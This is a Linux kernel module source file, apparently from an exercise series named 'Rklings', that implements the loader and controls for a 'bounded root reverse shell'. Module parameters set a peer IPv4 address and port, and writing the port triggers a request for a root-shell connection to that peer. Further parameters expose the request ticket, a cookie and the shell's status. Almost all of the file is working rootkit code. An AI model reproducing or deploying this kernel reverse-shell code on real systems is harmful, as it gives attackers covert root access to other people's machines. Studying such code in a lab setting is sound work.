// SPDX-License-Identifier: GPL-2.0
#include <linux/errno.h>
#include <linux/inet.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>

#include "root_shell.h"

#if RKLINGS_FAIL_POINT != 0
#error "unknown RKLINGS_FAIL_POINT"
#endif

static unsigned int shell_timeout_ms = 60000;
module_param(shell_timeout_ms, uint, 0400);
MODULE_PARM_DESC(shell_timeout_ms, "root-shell lifetime in milliseconds");

static struct rk_root_shell root_shell;
static struct rk_root_shell_ticket last_ticket;
static DEFINE_MUTEX(ticket_lock);
static unsigned short shell_port;
static char peer_address_text[16] = "127.0.0.1";
static __be32 peer_address;

module_param_string(peer_address, peer_address_text,
		    sizeof(peer_address_text), 0400);
MODULE_PARM_DESC(peer_address, "root-shell IPv4 peer address");

static int rk_shell_port_set(const char *value,
			     const struct kernel_param *parameter)
{
	struct rk_root_shell_ticket ticket;
	unsigned short port;
	int error;

	error = kstrtou16(value, 0, &port);
	if (error)
		return error;
	if (!port)
		return -EINVAL;
	if (READ_ONCE(root_shell.initialized)) {
		error = rk_root_shell_request(&root_shell, peer_address, port,
					      &ticket);
		if (error)
			return error;
		mutex_lock(&ticket_lock);
		last_ticket = ticket;
		mutex_unlock(&ticket_lock);
	}
	*(unsigned short *)parameter->arg = port;
	return 0;
}

static const struct kernel_param_ops rk_shell_port_ops = {
	.set = rk_shell_port_set,
	.get = param_get_ushort,
};

module_param_cb(shell_port, &rk_shell_port_ops, &shell_port, 0600);
MODULE_PARM_DESC(shell_port, "request one root-shell connection");

static int rk_shell_ticket_get(char *buffer,
			       const struct kernel_param *parameter)
{
	struct rk_root_shell_ticket ticket;

	(void)parameter;
	mutex_lock(&ticket_lock);
	ticket = last_ticket;
	mutex_unlock(&ticket_lock);
	return scnprintf(buffer, PAGE_SIZE, "%08x %016llx\n",
			 ticket.request_id, (unsigned long long)ticket.cookie);
}

static const struct kernel_param_ops rk_shell_ticket_ops = {
	.get = rk_shell_ticket_get,
};

module_param_cb(shell_ticket, &rk_shell_ticket_ops, NULL, 0400);
MODULE_PARM_DESC(shell_ticket, "latest root-shell request and cookie");

static int rk_shell_status_get(char *buffer,
			       const struct kernel_param *parameter)
{
	struct rk_root_shell_status status;

	(void)parameter;
	rk_root_shell_snapshot(&root_shell, &status);
	return scnprintf(buffer, PAGE_SIZE, "%08x %s %d\n",
			 status.request_id,
			 rk_root_shell_state_name(status.state), status.result);
}

static const struct kernel_param_ops rk_shell_status_ops = {
	.get = rk_shell_status_get,
};

module_param_cb(shell_status, &rk_shell_status_ops, NULL, 0400);
MODULE_PARM_DESC(shell_status, "latest root-shell state and result");

static int __init rk_init(void)
{
	const char *end;
	struct rk_root_shell_ticket ticket;
	int error;

	if (!in4_pton(peer_address_text, -1, (u8 *)&peer_address, -1,
		      &end) || *end || !peer_address)
		return -EINVAL;
	error = rk_root_shell_init(&root_shell, shell_timeout_ms);
	if (error)
		return error;
	if (shell_port)
		error = rk_root_shell_request(&root_shell, peer_address,
					      shell_port, &ticket);
	if (!error && shell_port) {
		mutex_lock(&ticket_lock);
		last_ticket = ticket;
		mutex_unlock(&ticket_lock);
	}
	if (error)
		rk_root_shell_stop(&root_shell);
	return error;
}

static void __exit rk_exit(void)
{
	rk_root_shell_stop(&root_shell);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings bounded root reverse shell");
